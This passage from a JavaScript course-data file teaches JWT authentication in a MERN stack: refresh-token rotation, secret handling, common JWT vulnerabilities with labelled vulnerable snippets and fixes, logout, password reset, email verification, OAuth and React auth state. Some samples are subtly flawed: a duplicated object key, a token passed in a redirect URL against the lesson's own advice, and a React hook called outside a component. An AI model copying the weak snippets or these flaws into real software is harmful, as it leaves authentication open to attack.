    return res.status(401).json({ error: "Invalid refresh token" });
  }

  // Revoke old token (rotation — one-time use):
  await RefreshToken.updateOne({ _id: storedToken._id }, { isRevoked: true });

  // Issue new tokens:
  const newAccessToken = jwt.sign({ id: storedToken.userId }, process.env.JWT_SECRET, { expiresIn: "15m" });
  const newRefreshToken = jwt.sign({ id: storedToken.userId }, process.env.REFRESH_TOKEN_SECRET, { expiresIn: "7d" });

  // Store new refresh token:
  await RefreshToken.create({
    token: newRefreshToken,
    userId: storedToken.userId,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
  });

  res.json({ accessToken: newAccessToken, refreshToken: newRefreshToken });
});`
      },
      {
        heading: "Expiry Best Practices",
        points: [
          "Access token: 15 minutes to 1 hour — short enough to limit damage if stolen",
          "Refresh token: 7 to 30 days — long enough for good UX, short enough for reasonable security",
          "Implement refresh token rotation — each refresh issues a new refresh token and invalidates the old one",
          "Detect refresh token reuse (someone using an already-rotated token) — sign of theft, revoke all tokens for that user"
        ]
      },
      {
        heading: "Important Points to Remember",
        points: [
          "jwt.decode() reads expiry without verifying — use for proactive expiry checking only.",
          "Refresh 5 minutes before expiry — prevents failed requests during the expiry window.",
          "Token rotation (new refresh token on each use) limits the damage window of a stolen refresh token.",
          "Storing refresh tokens in DB adds overhead but enables revocation — essential for high-security apps."
        ]
      }
    ]
  },

  {
    title: "JWT Security Best Practices",
    subtitle: "Explained Like A Professional Security Audit Checklist",
    sections: [
      {
        heading: "Secret Management",
        code: `// ✅ Generate strong secrets:
const crypto = require("crypto");
const secret = crypto.randomBytes(64).toString("hex"); // 128 hex chars
// 5a3f8b2c1d9e4a7... — cryptographically random, 512 bits of entropy

// ✅ Use different secrets for access and refresh tokens:
JWT_SECRET=strong_random_64_byte_hex_for_access_tokens
REFRESH_TOKEN_SECRET=different_strong_random_64_byte_hex_for_refresh_tokens

// ❌ Never use weak secrets:
JWT_SECRET=secret
JWT_SECRET=password
JWT_SECRET=myapp

// ❌ Never hardcode in source code:
jwt.sign(payload, "hardcoded_secret"); // NEVER!

// ✅ Rotate secrets periodically for high-security apps
// (requires coordinated token re-issuance — advanced topic)`
      },
      {
        heading: "Payload Security",
        code: `// ✅ Minimum necessary data in payload:
jwt.sign({
  id: user._id,         // Reference to user — fetch full user from DB when needed
  role: user.role       // Include only what's needed for authorization
}, secret);

// ❌ Never include sensitive data:
jwt.sign({
  id: user._id,
  password: user.password,    // NEVER! Anyone can decode the payload
  ssn: user.ssn,              // NEVER! Payload is just Base64 encoded
  creditCard: user.creditCard // NEVER! Not encrypted, just encoded
}, secret);

// The payload is readable by anyone who has the token
// Only the SIGNATURE proves it wasn't tampered with
// The data itself is not protected from reading`
      },
      {
        heading: "Algorithm Security",
        code: `// ❌ NEVER accept "none" algorithm:
// Some older libraries allowed setting alg: "none" to bypass signature verification
// Always specify the algorithm you expect:
jwt.verify(token, secret, { algorithms: ["HS256"] });
// This rejects tokens claiming to use a different or no algorithm

// ✅ Use RS256 for public key infrastructure:
// Private key (server keeps secret) → signs tokens
// Public key (can share freely) → verifies tokens
// Useful when multiple services need to verify tokens independently`
      },
      {
        heading: "Token Transmission Security",
        code: `// ✅ Always use HTTPS in production — tokens intercepted over HTTP are stolen
// ✅ Authorization header format:
Authorization: Bearer <token>  // Standard format

// ❌ Never send tokens in URLs:
GET /dashboard?token=eyJhbGc...  // Token in URL → appears in:
// - Browser history
// - Server access logs
// - Referrer headers to third-party resources

// ❌ Avoid long token lifetimes:
expiresIn: "30d"  // 30 days is too long for most use cases
// Use: "15m" for access tokens, "7d" for refresh tokens`
      },
      {
        heading: "Security Checklist",
        points: [
          "✅ JWT_SECRET is at least 32 random characters — generated with crypto.randomBytes()",
          "✅ Token payload contains minimum necessary claims — no passwords or PII",
          "✅ Specify allowed algorithms in verify() — prevents algorithm substitution attacks",
          "✅ Access tokens expire in 15min-1hr; refresh tokens in 7-30 days",
          "✅ Tokens transmitted only over HTTPS — never in URLs",
          "✅ Refresh tokens stored in httpOnly cookies — protected from XSS",
          "✅ Different secrets for access and refresh tokens"
        ]
      }
    ]
  },

  {
    title: "Common JWT Vulnerabilities",
    subtitle: "Explained Like Common Security Mistakes and How to Avoid Them",
    sections: [
      {
        heading: "Vulnerability 1: Algorithm Confusion Attack",
        code: `// The attack:
// Attacker modifies token header to use "alg": "none"
// Vulnerable code that accepts any algorithm:
jwt.verify(token, secret); // Without algorithm restriction!

// Some libraries, when alg: "none", skip signature verification entirely
// Attacker creates a token with admin role and alg: "none" — no signature needed!

// ✅ The fix — always specify allowed algorithms:
jwt.verify(token, process.env.JWT_SECRET, {
  algorithms: ["HS256"] // Only accept HS256 — reject "none" and other algorithms
});`
      },
      {
        heading: "Vulnerability 2: Weak Secret",
        code: `// The attack:
// Attacker captures a JWT and runs offline brute-force:
// Tools like hashcat can try millions of common secrets per second
// A weak secret like "secret" or "password" is found in seconds

// Vulnerable:
jwt.sign(payload, "secret");      // Brute-forced in milliseconds
jwt.sign(payload, "myapp2024");   // Found in dictionary attack

// ✅ The fix — strong random secret:
const crypto = require("crypto");
// JWT_SECRET=crypto.randomBytes(64).toString("hex") in .env
// Never a human-readable string as the secret`
      },
      {
        heading: "Vulnerability 3: Token in URL / Logs",
        code: `// The attack:
// Tokens in URLs appear in:
// - Browser history (anyone with your browser can steal it)
// - Web server access logs (admin could steal all tokens)
// - Referrer headers when navigating to external links

// Vulnerable:
// GET /dashboard?token=eyJhbGc...

// ✅ The fix — always in Authorization header:
fetch("/dashboard", {
  headers: { "Authorization": \`Bearer \${token}\` }
});

// If you must use URL tokens (email links), make them:
// - One-time use (invalidate after first use)
// - Very short-lived (minutes, not hours)
// - Scoped to specific action only (password reset, not full auth)`
      },
      {
        heading: "Vulnerability 4: Missing Expiry",
        code: `// The attack:
// A stolen token without expiry is valid forever
// Even after password change, account compromise — token still works

// Vulnerable:
jwt.sign({ id: user._id }, secret);
// No expiresIn → token never expires!

// ✅ The fix — ALWAYS set expiry:
jwt.sign({ id: user._id }, secret, { expiresIn: "1h" });

// And handle expiry errors in verification:
try {
  jwt.verify(token, secret);
} catch (error) {
  if (error.name === "TokenExpiredError") {
    // Direct to refresh or re-login
  }
}`
      },
      {
        heading: "Vulnerability 5: Trusting Payload Without Verification",
        code: `// The attack:
// jwt.decode() doesn't verify — never use for auth decisions

// Vulnerable:
const data = jwt.decode(req.headers.authorization.split(" ")[1]);
const userId = data.id; // Attacker modified the payload — this is unverified!

// ✅ Always use jwt.verify():
const data = jwt.verify(token, process.env.JWT_SECRET);
// Only proceed with data from a VERIFIED token`
      },
      {
        heading: "Important Points to Remember",
        points: [
          "Specify algorithms in verify() — prevents algorithm confusion attacks.",
          "Use cryptographically random secrets — never human-readable strings.",
          "Always set token expiry — tokens without expiry are valid forever if stolen.",
          "Use jwt.verify() not jwt.decode() for authentication decisions — decode skips security checks."
        ]
      }
    ]
  },

  {
    title: "Implementing Logout with JWT",
    subtitle: "Explained Like Cancelling an Access Badge vs Waiting for It to Expire",
    sections: [
      {
        heading: "The Stateless Logout Problem",
        paragraphs: [
          "JWT's stateless nature creates a fundamental logout challenge: since the server doesn't store session state, there's no server-side record to delete. A client 'logging out' by deleting their local token still has a technically valid token — if they (or an attacker) kept a copy, it still works until natural expiry.",
          "True JWT logout requires either accepting this limitation (for low-risk apps), or adding a degree of statefulness to enable token revocation."
        ]
      },
      {
        heading: "Option 1: Client-Side Logout (Simple, Limited)",
        code: `// React logout:
function logout() {
  localStorage.removeItem("token");
  localStorage.removeItem("user");
  delete axios.defaults.headers.common["Authorization"];
  navigate("/login");
}

// Backend logout (just a placeholder — real JWT isn't invalidated):
app.post("/logout", verifyToken, (req, res) => {
  // JWT is stateless — nothing to invalidate on server
  // Client should delete their token
  res.json({ message: "Logged out successfully" });
});

// Limitation: if attacker captured the token, they can still use it
// until it expires naturally (up to 1 hour for your project)
// Acceptable for: low-risk apps, short token expiry, non-sensitive data`
      },
      {
        heading: "Option 2: Token Blacklist (More Secure)",
        code: `// Store revoked tokens in Redis (in-memory, fast):
const redis = require("redis");
const client = redis.createClient();

// Logout — add token to blacklist:
app.post("/logout", verifyToken, async (req, res) => {
  const token = req.headers.authorization.split(" ")[1];
  const decoded = jwt.decode(token);

  // Store in blacklist until token's natural expiry:
  const ttl = decoded.exp - Math.floor(Date.now() / 1000);
  if (ttl > 0) {
    await client.setEx(\`blacklist:\${token}\`, ttl, "revoked");
  }

  res.json({ message: "Logged out" });
});

// Middleware — check blacklist on every request:
exports.verifyToken = async (req, res, next) => {
  const token = req.headers.authorization?.split(" ")[1];

  // Check if token is blacklisted:
  const isBlacklisted = await client.get(\`blacklist:\${token}\`);
  if (isBlacklisted) {
    return res.status(401).json({ error: "Token has been revoked" });
  }

  // Proceed with normal verification...
  jwt.verify(token, process.env.JWT_SECRET);
  next();
};`
      },
      {
        heading: "Option 3: Short Expiry + Refresh Token Revocation",
        code: `// Best balance of security and performance:
// 1. Access tokens expire in 15 minutes — even if stolen, limited window
// 2. Logout revokes the REFRESH token in database:

app.post("/logout", verifyToken, async (req, res) => {
  const userId = req.user.id;

  // Revoke all refresh tokens for this user:
  await RefreshToken.updateMany({ userId }, { isRevoked: true });

  // After 15 minutes, access token expires and refresh fails → fully logged out
  res.json({ message: "Logged out" });
});

// This approach:
// - No Redis needed
// - After logout, old access token works max 15 more minutes
// - After 15 minutes, refresh fails → true logout
// - Acceptable for most applications`
      },
      {
        heading: "Important Points to Remember",
        points: [
          "JWT logout is fundamentally a trade-off — true stateless JWT can't be immediately invalidated.",
          "Client-side logout (delete local token) is sufficient for low-risk apps with short token expiry.",
          "Token blacklisting with Redis enables immediate revocation — adds Redis dependency.",
          "Short access token (15min) + refresh token revocation = good balance of security and simplicity."
        ]
      }
    ]
  },

  {
    title: "Password Reset Flow",
    subtitle: "Explained Like Issuing a Temporary Replacement ID Card",
    sections: [
      {
        heading: "Think About a Lost ID Card",
        paragraphs: [
          "When you lose your ID card, the issuing office doesn't just give you a new one over the phone — they send a secure verification to your registered contact (email or mobile), confirm your identity through that channel, and then allow you to set up new credentials in person or through that verified channel.",
          "Password reset follows the same secure flow — you can't just claim to own an account, you must prove it through a verified out-of-band channel (your email), using a temporary, one-time token."
        ]
      },
      {
        heading: "Step 1: Request Password Reset",
        code: `app.post("/auth/forgot-password", async (req, res) => {
  const { email } = req.body;

  const user = await User.findOne({ email });

  // Always respond same way — don't reveal if email exists:
  const genericMessage = "If that email is registered, you'll receive reset instructions";

  if (!user) {
    return res.json({ message: genericMessage });
  }

  // Generate one-time reset token (NOT a regular JWT):
  const resetToken = crypto.randomBytes(32).toString("hex");
  const resetTokenHash = crypto
    .createHash("sha256")
    .update(resetToken)
    .digest("hex");

  // Store hash in database with expiry:
  await User.findByIdAndUpdate(user._id, {
    passwordResetToken: resetTokenHash,
    passwordResetExpires: Date.now() + 10 * 60 * 1000 // 10 minutes
  });

  // Send plain token (not hash) to user's email:
  const resetUrl = \`\${process.env.FRONTEND_URL}/reset-password/\${resetToken}\`;
  await sendEmail({
    to: user.email,
    subject: "Password Reset Request",
    text: \`Reset your password: \${resetUrl}\n\nExpires in 10 minutes.\`
  });

  res.json({ message: genericMessage });
});`
      },
      {
        heading: "Step 2: Reset Password",
        code: `app.post("/auth/reset-password/:token", async (req, res) => {
  const { token } = req.params;
  const { password } = req.body;

  // Hash the token to compare with stored hash:
  const tokenHash = crypto
    .createHash("sha256")
    .update(token)
    .digest("hex");

  // Find user with valid, unexpired token:
  const user = await User.findOne({
    passwordResetToken: tokenHash,
    passwordResetExpires: { $gt: Date.now() }
  });

  if (!user) {
    return res.status(400).json({
      error: "Password reset token is invalid or has expired"
    });
  }

  // Set new password (pre-save hook will hash it):
  user.password = password;
  user.passwordResetToken = undefined;   // Invalidate token
  user.passwordResetExpires = undefined;
  await user.save();

  // Optionally: invalidate all existing JWT tokens
  // (by storing password change timestamp in DB and checking in verifyToken)

  res.json({ message: "Password reset successful. Please log in." });
});`
      },
      {
        heading: "Security Considerations",
        points: [
          "Always respond the same way whether email exists or not — prevents user enumeration attacks",
          "Store only the HASH of the reset token — if database is breached, plain tokens can't be used",
          "Short expiry (10 minutes) — reset tokens should be very short-lived",
          "One-time use — delete the token from database immediately after successful reset",
          "Consider invalidating all existing JWTs after password change — compromised account fully secured"
        ]
      },
      {
        heading: "Important Points to Remember",
        points: [
          "Never reveal whether an email is registered — always respond with a generic message.",
          "Store only the hash of the reset token in the database — not the plain token.",
          "Make reset tokens short-lived (10-30 minutes) and single-use.",
          "Use out-of-band verification (email) — can't reset password without access to registered email."
        ]
      }
    ]
  },

  {
    title: "Email Verification Flow",
    subtitle: "Explained Like a New Employee's Office Access Activation",
    sections: [
      {
        heading: "Think About New Employee Onboarding",
        paragraphs: [
          "A new employee gets an offer letter with their job details (account created), but their building access card doesn't work until HR activates it after verifying the employee actually showed up on their first day (email verification). Only after activation can they access all building systems.",
          "Email verification in web apps follows this same logic — an account is created but restricted until the user proves they own the email address by clicking a verification link sent to that address."
        ]
      },
      {
        heading: "Step 1: Create Unverified Account",
        code: `// Add verification fields to User schema:
const userSchema = new mongoose.Schema({
  name: String,
  email: { type: String, unique: true },
  password: String,
  isVerified: { type: Boolean, default: false },
  emailVerificationToken: String,
  emailVerificationExpires: Date
});

// Signup route:
app.post("/signup", async (req, res) => {
  const { name, email, password } = req.body;

  // Generate verification token:
  const verificationToken = crypto.randomBytes(32).toString("hex");
  const tokenHash = crypto.createHash("sha256").update(verificationToken).digest("hex");

  const newUser = new User({
    name,
    email,
    password: await bcrypt.hash(password, 10),
    isVerified: false,
    emailVerificationToken: tokenHash,
    emailVerificationExpires: Date.now() + 24 * 60 * 60 * 1000 // 24 hours
  });

  await newUser.save();

  // Send verification email:
  const verifyUrl = \`\${process.env.FRONTEND_URL}/verify-email/\${verificationToken}\`;
  await sendEmail({
    to: email,
    subject: "Verify your EduNexa account",
    html: \`<p>Click to verify: <a href="\${verifyUrl}">\${verifyUrl}</a></p>\`
  });

  res.status(201).json({
    message: "Account created. Please check your email to verify your account."
  });
});`
      },
      {
        heading: "Step 2: Handle Verification Link Click",
        code: `app.get("/auth/verify-email/:token", async (req, res) => {
  const tokenHash = crypto
    .createHash("sha256")
    .update(req.params.token)
    .digest("hex");

  const user = await User.findOne({
    emailVerificationToken: tokenHash,
    emailVerificationExpires: { $gt: Date.now() }
  });

  if (!user) {
    return res.status(400).json({
      error: "Verification link is invalid or has expired. Request a new one."
    });
  }

  // Activate the account:
  user.isVerified = true;
  user.emailVerificationToken = undefined;
  user.emailVerificationExpires = undefined;
  await user.save();

  res.json({ message: "Email verified! You can now log in." });
});

// Resend verification email:
app.post("/auth/resend-verification", async (req, res) => {
  const user = await User.findOne({ email: req.body.email, isVerified: false });
  if (!user) return res.json({ message: "Email already verified or not found" });

  // Generate new token and send email (same logic as signup)...
});`
      },
      {
        heading: "Enforcing Verification in Login",
        code: `app.post("/login", async (req, res) => {
  const user = await User.findOne({ email: req.body.email });
  // ... verify password ...

  // Check email verification:
  if (!user.isVerified) {
    return res.status(403).json({
      error: "Please verify your email before logging in",
      code: "EMAIL_NOT_VERIFIED",
      // Optionally include email so frontend can offer resend:
      email: user.email
    });
  }

  // Proceed with token generation...
  const token = jwt.sign({ id: user._id, role: user.role }, process.env.JWT_SECRET, { expiresIn: "1h" });
  res.json({ token });
});`
      },
      {
        heading: "Important Points to Remember",
        points: [
          "Email verification prevents fake accounts with other people's email addresses.",
          "Store only the token hash in the database — same security principle as password reset tokens.",
          "Provide a 'resend verification email' option — original email might be missed or expired.",
          "Clearly communicate in login responses that email verification is required — with the right error code for frontend handling."
        ]
      }
    ]
  },

  {
    title: "OAuth and Social Login Concepts",
    subtitle: "Explained Like Showing Your Library Card to Access Different Buildings",
    sections: [
      {
        heading: "Think About Federated Identity",
        paragraphs: [
          "A library card from the city library system lets you borrow from any branch in the city — you don't need a separate card for each branch. The branches trust the city library's verification of your identity. You prove who you are to the city library, and branches accept that proof.",
          "OAuth and social login work on this principle — a user proves their identity to a trusted provider (Google, GitHub, Facebook), and your application accepts that proof without handling the authentication itself."
        ]
      },
      {
        heading: "OAuth 2.0 Flow Overview",
        code: `// The Authorization Code Flow (most secure, for server-side apps):

// Step 1: Redirect user to provider's authorization page:
// GET https://accounts.google.com/oauth/authorize?
//   client_id=YOUR_CLIENT_ID
//   &redirect_uri=https://yourapp.com/auth/google/callback
//   &response_type=code
//   &scope=email profile

// Step 2: User logs in with Google and grants permission

// Step 3: Google redirects to your callback URL with an auth code:
// GET https://yourapp.com/auth/google/callback?code=AUTHORIZATION_CODE

// Step 4: Your server exchanges code for access token (server-to-server):
// POST https://oauth2.googleapis.com/token
// { code, client_id, client_secret, redirect_uri, grant_type: "authorization_code" }

// Step 5: Use access token to get user info:
// GET https://www.googleapis.com/oauth2/v2/userinfo
// Authorization: Bearer ACCESS_TOKEN

// Step 6: Create/find user in your database, issue your own JWT`
      },
      {
        heading: "Implementing with Passport.js",
        code: `npm install passport passport-google-oauth20`,

        code: `const passport = require("passport");
const GoogleStrategy = require("passport-google-oauth20").Strategy;

passport.use(new GoogleStrategy({
  clientID: process.env.GOOGLE_CLIENT_ID,
  clientSecret: process.env.GOOGLE_CLIENT_SECRET,
  callbackURL: "/auth/google/callback"
},
async (accessToken, refreshToken, profile, done) => {
  try {
    // Find existing user or create new one:
    let user = await User.findOne({ googleId: profile.id });

    if (!user) {
      user = await User.create({
        googleId: profile.id,
        name: profile.displayName,
        email: profile.emails[0].value,
        isVerified: true,  // Google already verified the email
        role: "student"
      });
    }

    done(null, user);
  } catch (error) {
    done(error, null);
  }
}));

// Routes:
app.get("/auth/google",
  passport.authenticate("google", { scope: ["email", "profile"] })
);

app.get("/auth/google/callback",
  passport.authenticate("google", { session: false }),
  (req, res) => {
    // Issue YOUR JWT after successful OAuth:
    const token = jwt.sign({ id: req.user._id, role: req.user.role }, process.env.JWT_SECRET, { expiresIn: "1h" });
    res.redirect(\`\${process.env.FRONTEND_URL}/oauth-success?token=\${token}\`);
  }
);`
      },
      {
        heading: "Key OAuth Concepts",
        points: [
          "OAuth 2.0 is an authorization framework — it delegates authentication to a trusted provider",
          "You receive an access token to get user info from the provider — then issue your own JWT",
          "Users with social login typically have isVerified: true automatically (provider verified the email)",
          "Store a googleId (or githubId) in your User model — allows finding users by OAuth identity"
        ]
      },
      {
        heading: "Important Points to Remember",
        points: [
          "OAuth is about authorization delegation — you trust Google/GitHub to authenticate the user.",
          "After OAuth, you still issue your own JWT — don't use the OAuth token directly for your API.",
          "Social login users don't have passwords — handle password reset carefully for these accounts.",
          "Passport.js simplifies OAuth strategy implementation with its strategy pattern."
        ]
      }
    ]
  },

  {
    title: "JWT in React Frontend",
    subtitle: "Explained Like a Passport System for Your React Application",
    sections: [
      {
        heading: "Complete Frontend Auth Architecture",
        paragraphs: [
          "A well-designed React frontend authentication system has several interconnected parts: storing and reading the token, including it in requests automatically, handling expiry gracefully, protecting routes from unauthenticated access, and managing auth state application-wide.",
          "Your existing MERN project implements most of this — this topic ties it all together and shows the professional complete picture."
        ]
      },
      {
        heading: "Auth Context — Global Auth State",
        code: `// context/AuthContext.jsx:
import { createContext, useContext, useState, useEffect } from "react";
import axios from "axios";

const AuthContext = createContext(null);

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [token, setToken] = useState(localStorage.getItem("token"));
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    // Set axios default header when token changes:
    if (token) {
      axios.defaults.headers.common["Authorization"] = \`Bearer \${token}\`;
    } else {
      delete axios.defaults.headers.common["Authorization"];
    }
    setLoading(false);
  }, [token]);

  function login(newToken, userData) {
    setToken(newToken);
    setUser(userData);
    localStorage.setItem("token", newToken);
    localStorage.setItem("user", JSON.stringify(userData));
  }

  function logout() {
    setToken(null);
    setUser(null);
    localStorage.removeItem("token");
    localStorage.removeItem("user");
    delete axios.defaults.headers.common["Authorization"];
  }

  return (
    <AuthContext.Provider value={{ user, token, login, logout, loading }}>
      {children}
    </AuthContext.Provider>
  );
}

export const useAuth = () => useContext(AuthContext);`
      },
      {
        heading: "Protected Route Component",
        code: `// components/ProtectedRoute.jsx:
import { Navigate, useLocation } from "react-router-dom";
import { useAuth } from "../context/AuthContext";

function ProtectedRoute({ children, requiredRole }) {
  const { user, token, loading } = useAuth();
  const location = useLocation();

  // Show loading while checking auth:
  if (loading) return <div>Loading...</div>;

  // Redirect to login if not authenticated:
  if (!token) {
    return <Navigate to="/login" state={{ from: location }} replace />;
  }

  // Check role if required:
  if (requiredRole && user?.role !== requiredRole) {
    return <Navigate to="/unauthorized" replace />;
  }

  return children;
}

// Usage in App.jsx:
<Route path="/home" element={
  <ProtectedRoute>
    <Home />
  </ProtectedRoute>
} />

<Route path="/admin" element={
  <ProtectedRoute requiredRole="admin">
    <AdminDashboard />
  </ProtectedRoute>
} />`
      },
      {
        heading: "Axios Interceptors for Auto-Refresh",
        code: `// Set up once in your app initialization:
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    if (error.response?.status === 401 &&
        error.response?.data?.error?.code === "TOKEN_EXPIRED" &&
        !originalRequest._retry) {

      originalRequest._retry = true;

      try {
        // Try to refresh:
        const { data } = await axios.post("/auth/refresh");
        const newToken = data.accessToken;

        // Update storage and header:
        localStorage.setItem("token", newToken);
        axios.defaults.headers.common["Authorization"] = \`Bearer \${newToken}\`;
        originalRequest.headers.Authorization = \`Bearer \${newToken}\`;

        return axios(originalRequest); // Retry with new token
      } catch {
        // Refresh failed — log out:
        useAuth().logout();
        window.location.href = "/login";
      }
    }

    return Promise.reject(error);
  }
);`
      },
      {
        heading: "Important Points to Remember",
        points: [
          "Auth Context provides global auth state — avoids prop drilling token/user through the app.",
          "ProtectedRoute wraps sensitive routes — redirects to login with return URL for smooth UX.",
          "Axios default headers automatically include token in all requests after login.",
          "Response interceptors handle 401 errors silently — refresh token and retry without user knowing."
        ]
      }
    ]
  },

  {
    title: "Complete Auth System - Putting It Together",
    subtitle: "Explained Like Assembling All the Security Layers of a Modern Building",
    sections: [
      {
        heading: "The Complete Picture",
        paragraphs: [
          "Throughout this course, you've learned each component of JWT authentication separately. This final topic assembles them into a cohesive, production-quality authentication system — showing how all the pieces connect and how your existing MERN project compares to this complete pattern.",
          "Your MERN learning platform already implements a working auth system. This topic is the 'architect's overview' — understanding how all pieces fit together and what a fully hardened version would look like."
        ]
      },
      {
        heading: "Complete Auth Flow — All Routes",
        code: `// routes/authRoutes.js:
const router = express.Router();

// Public routes (no auth required):
router.post("/signup", signupValidation, signup);
router.post("/login", authLimiter, loginValidation, login);
router.post("/refresh", refresh);
router.post("/forgot-password", forgotPassword);
router.post("/reset-password/:token", resetPasswordValidation, resetPassword);
router.get("/verify-email/:token", verifyEmail);
router.post("/resend-verification", resendVerification);

// OAuth routes:
router.get("/google", passport.authenticate("google", { scope: ["email", "profile"] }));
router.get("/google/callback", googleCallback);

// Protected routes (auth required):
router.use(verifyToken);
router.post("/logout", logout);
router.get("/me", getMe);
router.patch("/update-password", updatePasswordValidation, updatePassword);`
      },
      {
        heading: "User Model With All Auth Fields",
        code: `const userSchema = new mongoose.Schema({
  // Core:
  name: { type: String, required: true },
  email: { type: String, required: true, unique: true, lowercase: true },
  password: { type: String, select: false }, // Excluded from queries by default

  // Roles and status:
  role: { type: String, enum: ["student", "instructor", "admin"], default: "student" },
  isVerified: { type: Boolean, default: false },
  isActive: { type: Boolean, default: true },

  // Email verification:
  emailVerificationToken: String,
  emailVerificationExpires: Date,

  // Password reset:
  passwordResetToken: String,
  passwordResetExpires: Date,

  // Security tracking:
  passwordChangedAt: Date,  // Used to invalidate old tokens after password change
  loginAttempts: { type: Number, default: 0 },
  lockUntil: Date,           // Account lockout after failed attempts

  // OAuth:
  googleId: String,
  githubId: String,

}, { timestamps: true });

// Middleware: hash password before save
userSchema.pre("save", async function(next) {
  if (!this.isModified("password")) return next();
  this.password = await bcrypt.hash(this.password, 12);
  this.passwordChangedAt = Date.now() - 1000; // 1s before to avoid edge cases
  next();
});

// Instance method: check if password changed after token was issued
userSchema.methods.changedPasswordAfter = function(jwtTimestamp) {
  if (this.passwordChangedAt) {
    const changedTime = Math.floor(this.passwordChangedAt.getTime() / 1000);
    return changedTime > jwtTimestamp; // Password changed after token issued
  }
  return false;
};`
      },
      {
        heading: "Your Project's Current State vs Complete System",
        points: [
          "✅ Already implemented: signup, login, bcrypt hashing, JWT generation, verifyToken middleware, progress protection",
          "⬆️ Could improve: add email verification, password reset flow, refresh tokens",
          "⬆️ Could improve: move JWT_SECRET to .env separate from REFRESH_SECRET (already done!)",
          "⬆️ Could improve: add rate limiting to login route (express-rate-limit covered earlier)",
          "⬆️ Could improve: token blacklist for immediate logout invalidation",
          "🎯 Your project is a solid foundation — the improvements above are for production hardening"
        ]
      },
      {
        heading: "What You've Built",
        paragraphs: [
          "Congratulations — you've now completed all courses in the EduNexa MERN Stack curriculum. HTML, CSS, JavaScript, Git & GitHub, React.js, Node.js, Express.js, MongoDB, REST APIs, and JWT Authentication — the complete foundation of a full-stack MERN developer.",
          "More importantly, you've been learning by building a real, working project throughout. Your MERN learning platform isn't just a tutorial exercise — it implements real authentication, real progress tracking, real API design, and real database operations. That's the best kind of learning."
        ]
      },
      {
        heading: "Important Points to Remember",
        points: [
          "Authentication is a system — signup, login, verification, reset, refresh, logout all work together.",
          "Your existing auth implementation is correct and functional — the improvements are hardening, not fixes.",
          "Security is layered — no single measure is sufficient; combine JWT + bcrypt + rate limiting + HTTPS + validation.",
          "You've now covered the complete MERN stack — HTML to JWT, frontend to backend, UI to database."
        ]
      }
    ]
  }

];